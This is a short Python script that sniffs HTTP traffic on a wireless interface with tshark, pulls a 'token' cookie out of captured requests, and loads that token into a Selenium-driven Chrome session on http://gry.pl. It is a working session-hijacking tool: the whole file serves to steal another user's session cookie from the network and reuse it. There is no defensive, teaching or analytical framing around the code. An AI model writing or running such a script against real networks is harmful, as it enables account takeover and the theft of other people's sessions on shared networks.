import subprocess as sub
import re
import selenium.webdriver

url = 'http://gry.pl'

def get_token():
    proc = sub.Popen(('sudo', 'tshark', '-i', 'wlp3s0', '-Y', 'http.request', '-T','fields', '-e', 'http.cookie'), stdout=sub.PIPE, stderr=sub.DEVNULL)
    found = False

    while not found:
        cookie = proc.stdout.readline()
        cookie_str = cookie.decode(encoding="utf-8")
        match = re.search("token=(.*?);", cookie_str)

        if(match):
            found = True;

    token = match.group(1)

    return token


cookie = get_token()
print(cookie + "STARTING SESSION IN CHROME\n")
driver = selenium.webdriver.Chrome()
driver.get(url)
driver.add_cookie({"name": "token", 'value': cookie})
driver.get(url)
